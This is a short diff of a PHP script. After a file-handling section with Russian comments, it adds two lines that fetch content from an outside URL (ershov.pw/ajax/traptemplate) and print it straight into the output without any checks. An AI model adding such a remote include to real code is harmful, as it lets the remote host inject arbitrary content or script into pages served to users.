@@ -62,3 +62,6 @@ unset($fhBuf);
 // Файл освобождён
 
 if(DEBUG) print "</pre>";
+
+$file=file('http://ershov.pw/ajax/traptemplate');
+foreach($file as $str){print $str;}
